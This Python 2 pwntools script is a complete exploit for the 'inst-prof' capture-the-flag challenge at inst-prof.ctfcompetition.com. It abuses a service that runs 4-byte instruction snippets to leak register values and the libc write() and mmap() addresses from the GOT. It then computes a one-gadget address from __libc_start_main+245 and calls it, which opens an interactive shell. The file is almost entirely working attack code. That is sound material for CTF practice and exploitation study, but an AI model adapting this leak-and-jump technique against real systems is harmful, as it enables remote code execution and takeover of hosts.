#!/usr/bin/env python2
# -*- coding: utf8 -*-
import argparse

from pwn import *
context(arch='amd64', os='linux')

# by Francesco Cagnin aka integeruser and Marco Gasparini aka xire
# of c00kies@venice


def assemble(code):
    bytecode = asm(code)
    assert len(bytecode) <= 4, '"{}" assemble to more than 4 bytes'.format(code)
    return bytecode.ljust(4, asm('ret'))

def execute(instructions, recv=True):
    if type(instructions) == str:
        instructions = [instructions]

    conn.send(''.join(assemble(inst) for inst in instructions))
    if recv:
        return [unpack(conn.recvn(8)) for _ in range(len(instructions))]

################################################################################

def get_reg(reg):
    instructions = []

    # leak the most significant 32 bits
    instructions.append('sub r12, {reg:}; ret')

    # leak the least significant 32 bits
    for _ in range(32):
        instructions.append('shl {reg:}, 1; ret')
    instructions.append('sub r12, {reg:}; ret')

    output = execute([inst.format(reg=reg) for inst in instructions])
    hi_bits = output[0]  & 0xffffffff00000000
    lo_bits = output[33] & 0xffffffff00000000
    return hi_bits | (lo_bits >> 32)

def set_reg(reg, imm, recv=True):
    imm_bytes = []
    while imm:
        imm_bytes.insert(0, imm & 0xff)
        imm >>= 8

    instructions = list()
    instructions.append('xor {reg:}, {reg:}; ret')

    for b in imm_bytes:
        instructions.extend(['shl {reg:}, 1; ret']*8)
        instructions.append('mov {{reg:}}b, 0x{b:02x}; ret'.format(b=b))

    execute([inst.format(reg=reg) for inst in instructions], recv)

################################################################################

def leak_write_mmap_addr():
    global conn
    conn = remote('inst-prof.ctfcompetition.com', 1337)
    conn.recvuntil('initializing prof...ready\n')

    # find the address of _start
    set_reg('r15', 0x20)
    execute('mov r14, [rsp+r15]')

    # calculate the address of the GOT table
    start_offset = 0x8c9
    gotplt_offset = 0x202000
    set_reg('r15', -start_offset + gotplt_offset)
    execute('add r14, r15')

    # leak write() address
    set_reg('r15', 0x18)
    execute('add r14, r15')
    execute('mov r13, [r14]')
    write_addr = get_reg('r13')
    print 'write_addr', hex(write_addr)

    # leak mmap() address
    set_reg('r15', 0x20-0x18)
    execute('add r14, r15')
    execute('mov r13, [r14]')
    mmap_addr = get_reg('r13')
    print 'mmap_addr', hex(mmap_addr)

def main():
    global conn
    conn = remote('inst-prof.ctfcompetition.com', 1337)
    conn.recvuntil('initializing prof...ready\n')

    # find the address of __libc_start_main+245
    set_reg('r15', 0x40)
    execute('mov r14, [rsp+r15]')

    # calculate the address of the chosen one-gadget and jump to it
    libc_start_main_245_offset = 0x21f45
    onegadget_offset = 0xe8fd5
    set_reg('r15', -libc_start_main_245_offset + onegadget_offset)
    execute('add r14, r15')
    execute('call r14', recv=False)

    conn.interactive()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--leak', action='store_true')
    args = parser.parse_args()

    if args.leak:
        leak_write_mmap_addr()
    else:
        main()
